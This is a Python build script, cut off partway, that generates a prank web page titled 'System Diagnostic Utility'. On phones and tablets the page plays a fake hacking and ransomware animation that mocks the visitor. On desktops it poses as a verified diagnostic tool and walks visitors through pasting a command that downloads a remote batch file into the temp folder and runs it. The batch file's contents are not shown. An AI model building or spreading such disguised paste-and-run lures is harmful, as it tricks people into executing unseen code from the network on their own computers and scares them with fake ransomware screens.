#!/usr/bin/env python3
"""
build_web.py
Compiles index.html with:
1. Exact mobile device detection: iPhone, iPad, Android Phone, Android Tablet, Desktop
2. Upgraded authentic retro cyber terminal with top window chrome, timestamps,
   threatening fake exploit buildup, devastating device roasts, screen twitches, and haptics
3. Desktop experience with verified 1-click terminal command box (Windows CMD & macOS/Linux Bash)
4. Embedded Base64 meme images so it requires ZERO external assets or server dependencies
"""

import base64
import glob
import json
import os

MEME_FILES = [
    "10 Funny Versions of Monalisa Trolling the Internet.jpg",
    "45+ Funny History Memes That Aren’t Just For History Buffs.jpg",
    "45036065019418068.jpg",
    "Can’t Believe I Almost Skipped These Historical Gems.jpg",
    "Crazy Funny Pictures.jpg",
    "Dog Meme Look.jpg",
    "Dream.jpg",
    "gif.jpg",
    "Meme Deole.jpg",
    "Meme Pfp Ideas.jpg",
    "Mr bean funny meme.jpg",
    "patrick.jpg",
    "Pitudo Meme.jpg",
    "repost.jpg",
    "Results for quiz I judge ur music taste.jpg",
    "shocked.jpg",
    "What I look like 99% of the time.jpg",
    "WHO.jpg"
]

def load_memes_base64():
    memes_data = []
    for fname in MEME_FILES:
        target_path = None
        for sdir in ["memes", "."]:
            cand = os.path.join(sdir, fname)
            if os.path.exists(cand):
                target_path = cand
                break
            pattern = os.path.join(sdir, fname.replace("’", "*").replace("'", "*"))
            matches = glob.glob(pattern)
            if matches:
                target_path = matches[0]
                break
        if target_path and os.path.exists(target_path):
            with open(target_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("utf-8")
                memes_data.append({
                    "name": os.path.basename(target_path),
                    "data": f"data:image/jpeg;base64,{b64}",
                    "size": os.path.getsize(target_path)
                })
    return memes_data

def build():
    memes = load_memes_base64()
    print(f"Loaded {len(memes)} meme images into memory.")
    memes_json = json.dumps(memes)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>System Diagnostic Utility</title>
<style>
  * {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-user-select: none;
    user-select: none;
    -webkit-touch-callout: none;
  }}
  html, body {{
    width: 100%;
    height: 100%;
    background-color: #030608;
    color: #00ff66;
    font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
    overflow: hidden;
    position: fixed;
  }}

  /* Mobile / Tablet Fullscreen Terminal */
  #mobile-terminal {{
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    height: 100dvh;
    background: #04070a;
    color: #00ff66;
    overflow-y: auto;
    overflow-x: hidden;
    scroll-behavior: smooth;
    -webkit-overflow-scrolling: touch;
    z-index: 99999;
    padding: 0;
  }}

  /* Clean CRT Scanlines */
  #mobile-terminal::before {{
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(
      0deg,
      rgba(0, 0, 0, 0.14),
      rgba(0, 0, 0, 0.14) 1px,
      transparent 1px,
      transparent 2px
    );
    pointer-events: none;
    z-index: 20;
  }}

  /* Subtle CRT Vignette */
  #mobile-terminal::after {{
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.65);
    pointer-events: none;
    z-index: 21;
  }}

  /* Retro Linux/Hacker Window Header Bar */
  .term-header {{
    position: sticky;
    top: 0;
    left: 0;
    width: 100%;
    padding: max(env(safe-area-inset-top, 0px), 8px) 14px 8px 14px;
    background: rgba(8, 12, 18, 0.94);
    border-bottom: 1px solid #162a1d;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    z-index: 30;
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.6);
  }}
  .term-dots {{
    display: flex;
    gap: 6px;
    align-items: center;
    flex-shrink: 0;
  }}
  .term-dot {{
    width: 10px;
    height: 10px;
    border-radius: 50%;
  }}
  .dot-red {{ background: #ff5f56; box-shadow: 0 0 5px rgba(255, 95, 86, 0.6); }}
  .dot-yellow {{ background: #ffbd2e; box-shadow: 0 0 5px rgba(255, 189, 46, 0.6); }}
  .dot-green {{ background: #27c93f; box-shadow: 0 0 5px rgba(39, 201, 63, 0.6); }}

  .term-title {{
    font-size: 11px;
    color: #4ee685;
    letter-spacing: 0.5px;
    font-weight: bold;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    text-align: center;
    flex: 1;
  }}
  .term-badge {{
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 9px;
    background: rgba(255, 59, 92, 0.15);
    color: #ff3b5c;
    border: 1px solid rgba(255, 59, 92, 0.4);
    padding: 2px 7px;
    border-radius: 10px;
    font-weight: bold;
    letter-spacing: 0.5px;
    flex-shrink: 0;
  }}
  .badge-dot {{
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #ff3b5c;
    box-shadow: 0 0 6px #ff3b5c;
    animation: pulseBadge 1.2s infinite;
  }}
  @keyframes pulseBadge {{
    0%, 100% {{ opacity: 1; transform: scale(1); }}
    50% {{ opacity: 0.35; transform: scale(0.85); }}
  }}

  /* Terminal Body Container */
  .term-body {{
    padding: 16px 14px calc(50px + env(safe-area-inset-bottom, 0px)) 14px;
    max-width: 580px;
    margin: 0 auto;
    font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
    font-size: clamp(11.5px, 3.2vw, 13.5px);
    line-height: 1.55;
    letter-spacing: 0.2px;
    word-break: break-word;
    white-space: pre-wrap;
  }}
  .line {{
    margin-bottom: 2px;
    word-break: break-word;
  }}
  .line-green {{ color: #00ff66; text-shadow: 0 0 5px rgba(0, 255, 102, 0.35); }}
  .line-red {{ color: #ff3b5c; font-weight: bold; text-shadow: 0 0 7px rgba(255, 59, 92, 0.55); }}
  .line-yellow {{ color: #ffd228; text-shadow: 0 0 5px rgba(255, 210, 40, 0.35); }}
  .line-cyan {{ color: #00e5ff; text-shadow: 0 0 5px rgba(0, 229, 255, 0.35); }}
  .line-white {{ color: #ffffff; font-weight: bold; text-shadow: 0 0 6px rgba(255, 255, 255, 0.4); }}
  .line-dim {{ color: #284432; letter-spacing: 1px; }}
  .line-box {{
    color: #ff3b5c;
    font-weight: bold;
    background: rgba(255, 59, 92, 0.08);
    border-left: 2px solid #ff3b5c;
    padding-left: 5px;
    margin: 1px 0;
    text-shadow: 0 0 6px rgba(255, 59, 92, 0.45);
  }}

  .cursor {{
    display: inline-block;
    width: 8px;
    height: 14px;
    background-color: #00ff66;
    vertical-align: -2px;
    margin-left: 3px;
    box-shadow: 0 0 8px rgba(0, 255, 102, 0.8);
    animation: blink 0.7s infinite;
  }}
  @keyframes blink {{
    0%, 49% {{ opacity: 1; }}
    50%, 100% {{ opacity: 0; }}
  }}

  /* Screen Twitch / Glitch */
  .glitch-twitch {{
    animation: twitch 0.14s ease-in-out;
  }}
  @keyframes twitch {{
    0% {{ transform: translate(0, 0); }}
    25% {{ transform: translate(-3px, 2px) skewX(-1deg); filter: hue-rotate(60deg); }}
    50% {{ transform: translate(3px, -2px) skewX(1deg); filter: hue-rotate(-60deg); }}
    75% {{ transform: translate(-2px, -1px); }}
    100% {{ transform: translate(0, 0); filter: none; }}
  }}

  /* Desktop Container */
  #desktop-container {{
    display: none;
    width: 100vw;
    height: 100vh;
    position: relative;
    background: #040608;
  }}
  #desktop-canvas {{
    width: 100%;
    height: 100%;
    display: block;
  }}
  #desktop-launcher {{
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 640px;
    max-width: 92%;
    background: #0a0e13;
    border: 2px solid #00e650;
    padding: 30px;
    box-shadow: 0 0 35px rgba(0, 230, 80, 0.2);
    text-align: left;
    z-index: 100;
  }}
  .dt-title {{
    font-size: 20px;
    color: #00e650;
    margin-bottom: 16px;
    border-bottom: 1px solid #1a3320;
    padding-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .dt-row {{
    font-size: 14px;
    color: #8bb396;
    margin-bottom: 10px;
    line-height: 1.4;
  }}
  .dt-row span.ok {{
    color: #00e650;
  }}
  .os-tabs {{
    display: flex;
    gap: 8px;
    margin-top: 16px;
    margin-bottom: 6px;
  }}
  .os-tab {{
    flex: 1;
    background: #080d0a;
    border: 1px solid #1a3320;
    color: #557760;
    padding: 8px 12px;
    font-family: inherit;
    font-size: 12px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
  }}
  .os-tab.active {{
    background: #0f1c14;
    border-color: #00e650;
    color: #00e650;
    box-shadow: 0 0 10px rgba(0, 230, 80, 0.25);
  }}
  .cmd-box {{
    background: #040608;
    border: 1px solid #1a3320;
    border-left: 3px solid #00e650;
    color: #00e650;
    font-family: Consolas, "Courier New", monospace;
    font-size: 13px;
    padding: 14px;
    margin: 10px 0 14px 0;
    line-height: 1.4;
    word-break: break-all;
    -webkit-user-select: all;
    user-select: all;
  }}
  .copy-btn {{
    width: 100%;
    background: #0f1c14;
    border: 1px solid #00e650;
    color: #00e650;
    padding: 14px 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
    letter-spacing: 0.5px;
  }}
  .copy-btn:hover {{
    background: #00e650;
    color: #040608;
    box-shadow: 0 0 18px rgba(0, 230, 80, 0.4);
  }}
  .cmd-hint {{
    margin-top: 14px;
    font-size: 12px;
    color: #72967b;
    line-height: 1.5;
  }}
  .cmd-hint b {{
    color: #00e650;
  }}
</style>
</head>
<body>

<!-- Mobile / Tablet Roaster Terminal -->
<div id="mobile-terminal">
  <!-- Retro Linux/Hacker Window Header -->
  <div class="term-header">
    <div class="term-dots">
      <div class="term-dot dot-red"></div>
      <div class="term-dot dot-yellow"></div>
      <div class="term-dot dot-green"></div>
    </div>
    <div class="term-title" id="term-header-title">root@mobile:~ (exploit_v4)</div>
    <div class="term-badge"><span class="badge-dot"></span> LIVE</div>
  </div>

  <div class="term-body" id="mobile-content">
    <div id="typed-lines"></div>
    <div id="active-line"><span id="current-text"></span><span class="cursor"></span></div>
  </div>
</div>

<!-- Desktop Container -->
<div id="desktop-container">
  <canvas id="desktop-canvas"></canvas>

  <!-- Initial Desktop Verification / Terminal Command Display -->
  <div id="desktop-launcher">
    <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
    <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
    <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>

    <!-- OS Selection Tabs -->
    <div class="os-tabs">
      <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
      <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
    </div>
    
    <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" &amp;&amp; "%TEMP%\\launch.bat"</div>

    <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>

    <div class="cmd-hint" id="cmd-hint">
      &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
      &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
    </div>
  </div>
</div>

<script>
// Embedded meme assets
const MEME_ASSETS = {memes_json};

/* ==========================================================================
   DEVICE DETECTION
   ========================================================================== */
function detectDevice() {{
  const ua = navigator.userAgent || '';
  const platform = navigator.platform || '';
  const maxTouchPoints = navigator.maxTouchPoints || 0;

  // 1. iPhone / iPod
  if (/iPhone|iPod/i.test(ua)) {{
    return 'iphone';
  }}

  // 2. iPad: checks classic iPad UA or modern iPadOS reporting as MacIntel/Macintosh with touchpoints
  const isIPadOS = (platform === 'MacIntel' || platform === 'Macintosh' || /Macintosh/i.test(ua)) && maxTouchPoints > 1 && !window.MSStream;
  if (/iPad/i.test(ua) || isIPadOS) {{
    return 'ipad';
  }}

  // 3. Android devices
  if (/Android/i.test(ua)) {{
    if (/Mobile/i.test(ua) || (Math.min(window.screen.width, window.screen.height) < 600 && maxTouchPoints > 0)) {{
      return 'android-phone';
    }} else {{
      return 'android-tablet';
    }}
  }}

  // 4. Other mobile checks
  if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {{
    return 'android-phone';
  }}

  // 5. Desktop / Laptop
  return 'desktop';
}}

/* ==========================================================================
   MOBILE ROAST SCRIPTS & THREATENING / COMEDIC CADENCE
   ========================================================================== */
const IPHONE_SCRIPT = [
  {{ text: "root@iphone:~# ./stage_exploit", color: "line-cyan", speed: 42, pause: 600 }},
  {{ text: "[+] BYPASSING GATEWAY FIREWALL... [OK]", color: "line-green", speed: 38, pause: 650 }},
  {{ text: "[+] INJECTING KERNEL PAYLOAD..... [OK]", color: "line-green", speed: 38, pause: 700 }},
  {{ text: "[+] ROOT ACCESS: UID=0 (SYSTEM)", color: "line-yellow", speed: 40, pause: 850 }},
  {{ text: "", pause: 300 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "[!] TARGET:   APPLE IPHONE", color: "line-red", speed: 42, pause: 900, twitch: true }},
  {{ text: "[!] BATTERY:  14% [DRAINING RAPIDLY]", color: "line-yellow", speed: 38, pause: 750 }},
  {{ text: "[!] STORAGE:  99% [USELESS SELFIES]", color: "line-yellow", speed: 38, pause: 800 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "[*] SCANNING DIRECTORIES...", color: "line-red", speed: 40, pause: 750 }},
  {{ text: "[EXTRACT] /DCIM/selfie_01.jpg .. [OK]", color: "line-red", speed: 36, pause: 650 }},
  {{ text: "[EXTRACT] /WhatsApp/chats.db ... [OK]", color: "line-red", speed: 36, pause: 650 }},
  {{ text: "[EXTRACT] /Notes/passwords.txt . [OK]", color: "line-red", speed: 36, pause: 650 }},
  {{ text: "[EXTRACT] /Safari/3am_search.db  [OK]", color: "line-red", speed: 36, pause: 950, twitch: true }},
  {{ text: "", pause: 350 }},
  {{ text: "┌──────────────────────────────────┐", color: "line-box", speed: 12, pause: 200 }},
  {{ text: "│  ALL MOBILE FILES ENCRYPTED!     │", color: "line-box", speed: 36, pause: 700 }},
  {{ text: "│  RANSOM DEMAND: 500 DOGECOIN     │", color: "line-box", speed: 36, pause: 800 }},
  {{ text: "└──────────────────────────────────┘", color: "line-box", speed: 12, pause: 1300, twitch: true }},
  {{ text: "", pause: 450 }},
  {{ text: "...", color: "line-yellow", speed: 180, pause: 1300 }},
  {{ text: "WAIT.", color: "line-white", speed: 65, pause: 1100 }},
  {{ text: "HOLD ON.", color: "line-white", speed: 65, pause: 1000 }},
  {{ text: "STOP THE ATTACK PROTOCOL.", color: "line-yellow", speed: 48, pause: 1100 }},
  {{ text: "", pause: 350 }},
  {{ text: "YOU OPENED THIS ON A PHONE?! 💀", color: "line-red", speed: 52, pause: 1600, twitch: true }},
  {{ text: "ARE YOU SERIOUS RIGHT NOW?", color: "line-white", speed: 46, pause: 1100 }},
  {{ text: "", pause: 300 }},
  {{ text: "THIS IS A COMPUTER PRANK.", color: "line-white", speed: 45, pause: 1000 }},
  {{ text: "NOT A TIKTOK FILTER.", color: "line-green", speed: 40, pause: 600 }},
  {{ text: "NOT AN INSTAGRAM REEL.", color: "line-green", speed: 40, pause: 600 }},
  {{ text: "NOT A SCREENSHOT.", color: "line-green", speed: 40, pause: 700 }},
  {{ text: "A. COMPUTER. PRANK.", color: "line-white", speed: 60, pause: 1400, twitch: true }},
  {{ text: "", pause: 350 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "[OPERATOR CHATTER]", color: "line-cyan", speed: 40, pause: 600 }},
  {{ text: "> Op 1: Bro, victim has no keyboard.", color: "line-cyan", speed: 40, pause: 1000 }},
  {{ text: "> Op 2: What do we encrypt? Selfies?!", color: "line-cyan", speed: 40, pause: 1000 }},
  {{ text: "> Op 1: Abort exploit. Embarrassing.", color: "line-cyan", speed: 40, pause: 1200 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "MOBILE DIAGNOSTIC:", color: "line-white", speed: 40, pause: 650 }},
  {{ text: "❌ INSUFFICIENT SCREEN SIZE", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ INSUFFICIENT KEYBOARD", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ INSUFFICIENT COMMON SENSE", color: "line-red", speed: 38, pause: 700 }},
  {{ text: "💀 PANIC LEVEL: 99% (SWEATING)", color: "line-yellow", speed: 42, pause: 1100, twitch: true }},
  {{ text: "", pause: 350 }},
  {{ text: "CONCLUSION:", color: "line-white", speed: 45, pause: 900 }},
  {{ text: "YOU BOUGHT A $1,200 IPHONE...", color: "line-yellow", speed: 48, pause: 1200 }},
  {{ text: "JUST TO GET BULLIED BY A LINK. 😭", color: "line-red", speed: 52, pause: 1800, twitch: true }},
  {{ text: "", pause: 400 }},
  {{ text: "YOUR FILES ARE 100% SAFE.", color: "line-green", speed: 40, pause: 800 }},
  {{ text: "YOUR DIGNITY DID NOT SURVIVE.", color: "line-yellow", speed: 44, pause: 1100 }},
  {{ text: "", pause: 300 }},
  {{ text: "NICE TRY, NPC.", color: "line-white", speed: 46, pause: 800 }},
  {{ text: "COME BACK WITH A LAPTOP. 💀", color: "line-white", speed: 48, pause: 1400 }},
  {{ text: "TERMINATING IN 3... 2... 1...", color: "line-dim", speed: 38, pause: 1200 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 60, pause: 4000 }}
];

const ANDROID_PHONE_SCRIPT = [
  {{ text: "root@android:~# ./stage_exploit", color: "line-cyan", speed: 42, pause: 600 }},
  {{ text: "[+] SCANNING ADB INTERFACE... [OK]", color: "line-green", speed: 38, pause: 650 }},
  {{ text: "[+] ELEVATING PRIVILEGES..... [OK]", color: "line-green", speed: 38, pause: 700 }},
  {{ text: "[+] SELINUX STATUS: PERMISSIVE", color: "line-yellow", speed: 40, pause: 850 }},
  {{ text: "", pause: 300 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "[!] TARGET:   ANDROID PHONE", color: "line-red", speed: 42, pause: 900, twitch: true }},
  {{ text: "[!] BATTERY:  14% (DYING)", color: "line-yellow", speed: 38, pause: 750 }},
  {{ text: "[!] STORAGE:  99% (CLEANER APPS)", color: "line-yellow", speed: 38, pause: 800 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "[*] TARGETING SENSITIVE DATA...", color: "line-red", speed: 40, pause: 750 }},
  {{ text: "[EXTRACT] /DCIM/embarrassing.jpg [OK]", color: "line-red", speed: 36, pause: 650 }},
  {{ text: "[EXTRACT] /data/whatsapp.db ... [OK]", color: "line-red", speed: 36, pause: 650 }},
  {{ text: "[EXTRACT] /Download/virus.apk . [OK]", color: "line-red", speed: 36, pause: 650 }},
  {{ text: "[EXTRACT] /Chrome/3am_history . [OK]", color: "line-red", speed: 36, pause: 950, twitch: true }},
  {{ text: "", pause: 350 }},
  {{ text: "┌──────────────────────────────────┐", color: "line-box", speed: 12, pause: 200 }},
  {{ text: "│  ALL MOBILE FILES ENCRYPTED!     │", color: "line-box", speed: 36, pause: 700 }},
  {{ text: "│  RANSOM DEMAND: 500 DOGECOIN     │", color: "line-box", speed: 36, pause: 800 }},
  {{ text: "└──────────────────────────────────┘", color: "line-box", speed: 12, pause: 1300, twitch: true }},
  {{ text: "", pause: 450 }},
  {{ text: "...", color: "line-yellow", speed: 180, pause: 1300 }},
  {{ text: "WAIT.", color: "line-white", speed: 65, pause: 1100 }},
  {{ text: "HOLD ON.", color: "line-white", speed: 65, pause: 1000 }},
  {{ text: "NICE TRY, NPC. 💀", color: "line-red", speed: 52, pause: 1600, twitch: true }},
  {{ text: "", pause: 300 }},
  {{ text: "THIS PRANK REQUIRES A REAL PC.", color: "line-white", speed: 45, pause: 1000 }},
  {{ text: "YOUR PHONE CANNOT HANDLE THIS.", color: "line-yellow", speed: 44, pause: 1200 }},
  {{ text: "", pause: 300 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "MOBILE STATUS:", color: "line-white", speed: 40, pause: 600 }},
  {{ text: "❌ NO PHYSICAL KEYBOARD", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ NO DESKTOP ENVIRONMENT", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ NO COMMON SENSE FOUND", color: "line-red", speed: 38, pause: 700 }},
  {{ text: "💀 PANIC LEVEL: 99%", color: "line-yellow", speed: 42, pause: 1100, twitch: true }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "YOU INSTALLED 47 CLEANER APPS...", color: "line-yellow", speed: 46, pause: 1100 }},
  {{ text: "AND STILL CLICKED A RANDOM LINK. 😭", color: "line-red", speed: 50, pause: 1700, twitch: true }},
  {{ text: "", pause: 400 }},
  {{ text: "YOUR FILES ARE 100% SAFE.", color: "line-green", speed: 40, pause: 800 }},
  {{ text: "WE'LL PRETEND THIS NEVER HAPPENED.", color: "line-white", speed: 44, pause: 1100 }},
  {{ text: "", pause: 300 }},
  {{ text: "COME BACK WITH A KEYBOARD.", color: "line-white", speed: 46, pause: 1200 }},
  {{ text: "TERMINATING SESSION...", color: "line-dim", speed: 38, pause: 1100 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 60, pause: 4000 }}
];

const IPAD_SCRIPT = [
  {{ text: "root@ipad:~# ./stage_exploit", color: "line-cyan", speed: 42, pause: 600 }},
  {{ text: "[+] BYPASSING IPADOS SANDBOX... [OK]", color: "line-green", speed: 38, pause: 650 }},
  {{ text: "[+] INJECTING HOOKS............ [OK]", color: "line-green", speed: 38, pause: 700 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "[!] TARGET:  APPLE IPAD", color: "line-red", speed: 42, pause: 900, twitch: true }},
  {{ text: "[!] DISPLAY: OVERSIZED", color: "line-yellow", speed: 38, pause: 700 }},
  {{ text: "[!] PENCIL:  READY (USELESS HERE)", color: "line-yellow", speed: 38, pause: 850 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "WAIT.", color: "line-white", speed: 65, pause: 1100 }},
  {{ text: "BIGGER SCREEN.", color: "line-yellow", speed: 50, pause: 1000 }},
  {{ text: "STILL NOT A COMPUTER. 💀", color: "line-red", speed: 54, pause: 1600, twitch: true }},
  {{ text: "", pause: 300 }},
  {{ text: "YOU MADE IT BIGGER...", color: "line-white", speed: 45, pause: 1000 }},
  {{ text: "BUT STILL DIDN'T BRING A KEYBOARD.", color: "line-yellow", speed: 46, pause: 1400 }},
  {{ text: "", pause: 300 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "TABLET STATUS:", color: "line-white", speed: 40, pause: 600 }},
  {{ text: "❌ TOO BIG FOR MOBILE", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ TOO SMALL FOR THE SHOW", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ COMMON SENSE NOT FOUND", color: "line-red", speed: 38, pause: 700 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "NICE TRY.", color: "line-white", speed: 45, pause: 1000 }},
  {{ text: "COME BACK WITH A REAL COMPUTER. 😭", color: "line-red", speed: 50, pause: 1700, twitch: true }},
  {{ text: "TERMINATING SESSION...", color: "line-dim", speed: 38, pause: 1000 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 60, pause: 3000 }}
];

const ANDROID_TABLET_SCRIPT = [
  {{ text: "root@tablet:~# ./stage_exploit", color: "line-cyan", speed: 42, pause: 600 }},
  {{ text: "[+] SCANNING ARCHITECTURE...... [OK]", color: "line-green", speed: 38, pause: 650 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "[!] TARGET: ANDROID TABLET", color: "line-red", speed: 42, pause: 900, twitch: true }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "ABSOLUTELY NOT.", color: "line-red", speed: 55, pause: 1200, twitch: true }},
  {{ text: "YOU MADE IT BIGGER...", color: "line-yellow", speed: 45, pause: 1000 }},
  {{ text: "BUT STILL DIDN'T MAKE IT A PC. 💀", color: "line-white", speed: 50, pause: 1600, twitch: true }},
  {{ text: "", pause: 300 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "TABLET STATUS:", color: "line-white", speed: 40, pause: 600 }},
  {{ text: "❌ INSUFFICIENT CHAOS", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ INSUFFICIENT KEYBOARD", color: "line-red", speed: 38, pause: 550 }},
  {{ text: "❌ INSUFFICIENT COMMON SENSE", color: "line-red", speed: 38, pause: 700 }},
  {{ text: "------------------------------------", color: "line-dim", speed: 10, pause: 350 }},
  {{ text: "", pause: 300 }},
  {{ text: "NICE TRY.", color: "line-white", speed: 45, pause: 1000 }},
  {{ text: "COME BACK WITH A COMPUTER.", color: "line-yellow", speed: 46, pause: 1400 }},
  {{ text: "TERMINATING SESSION...", color: "line-dim", speed: 38, pause: 1000 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 60, pause: 3000 }}
];

/* ==========================================================================
   PROCEDURAL RETRO AUDIO CLICK GENERATOR
   ========================================================================== */
class MobileKeyAudio {{
  constructor() {{
    this.ctx = null;
  }}
  init() {{
    if (!this.ctx) {{
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) this.ctx = new AudioCtx();
    }}
    if (this.ctx && this.ctx.state === "suspended") {{
      this.ctx.resume();
    }}
  }}
  tick() {{
    if (!this.ctx) return;
    try {{
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = "square";
      osc.frequency.setValueAtTime(800 + Math.random() * 400, this.ctx.currentTime);
      gain.gain.setValueAtTime(0.04, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.012);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + 0.015);
    }} catch (e) {{}}
  }}
  alert() {{
    if (!this.ctx) return;
    try {{
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = "sawtooth";
      osc.frequency.setValueAtTime(180, this.ctx.currentTime);
      gain.gain.setValueAtTime(0.2, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.25);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + 0.25);
    }} catch (e) {{}}
  }}
}}

/* ==========================================================================
   TYPEWRITER ENGINE FOR MOBILE / TABLET
   ========================================================================== */
function runMobileTerminal(script, deviceType) {{
  const term = document.getElementById("mobile-terminal");
  const desktopCont = document.getElementById("desktop-container");
  const headerTitle = document.getElementById("term-header-title");
  const typedLines = document.getElementById("typed-lines");
  const currentTextSpan = document.getElementById("current-text");
  const content = document.getElementById("mobile-content");

  if (desktopCont) desktopCont.style.display = "none";
  term.style.display = "block";

  if (headerTitle) {{
    headerTitle.textContent = `root@${{deviceType}}:~ (exploit)`;
  }}

  const audio = new MobileKeyAudio();
  const unlockAudio = () => {{
    audio.init();
    window.removeEventListener("touchstart", unlockAudio);
    window.removeEventListener("click", unlockAudio);
  }};
  window.addEventListener("touchstart", unlockAudio, {{ passive: true }});
  window.addEventListener("click", unlockAudio, {{ passive: true }});

  let lineIdx = 0;
  let charIdx = 0;

  function typeChar() {{
    if (lineIdx >= script.length) {{
      return; // Completed, stops mobile prank cleanly
    }}

    const cur = script[lineIdx];
    const text = cur.text || "";

    if (text.length === 0) {{
      // Blank line
      const div = document.createElement("div");
      div.className = "line";
      div.innerHTML = "&nbsp;";
      typedLines.appendChild(div);
      lineIdx++;
      setTimeout(typeChar, cur.pause || 350);
      return;
    }}

    // Trigger twitch / glitch / vibration on alarming lines
    if (charIdx === 0 && cur.twitch) {{
      term.classList.add("glitch-twitch");
      setTimeout(() => term.classList.remove("glitch-twitch"), 150);
      if (navigator.vibrate) {{
        try {{ navigator.vibrate([50, 30, 50]); }} catch(e) {{}}
      }}
      audio.alert();
    }}

    if (charIdx < text.length) {{
      currentTextSpan.textContent = text.substring(0, charIdx + 1);
      currentTextSpan.className = cur.color || "line-green";
      charIdx++;
      if (Math.random() < 0.55) audio.tick();

      term.scrollTop = term.scrollHeight;
      window.scrollTo(0, document.body.scrollHeight);
      setTimeout(typeChar, cur.speed || 40);
    }} else {{
      // Finished current line
      const div = document.createElement("div");
      div.className = "line " + (cur.color || "line-green");
      div.textContent = text;
      typedLines.appendChild(div);
      currentTextSpan.textContent = "";
      charIdx = 0;
      lineIdx++;
      term.scrollTop = term.scrollHeight;
      window.scrollTo(0, document.body.scrollHeight);
      setTimeout(typeChar, cur.pause || 650);
    }}
  }}

  setTimeout(typeChar, 400);
}}

/* ==========================================================================
   DESKTOP LAUNCHER CONTROLLER
   ========================================================================== */
function initDesktop() {{
  const desktopContainer = document.getElementById("desktop-container");
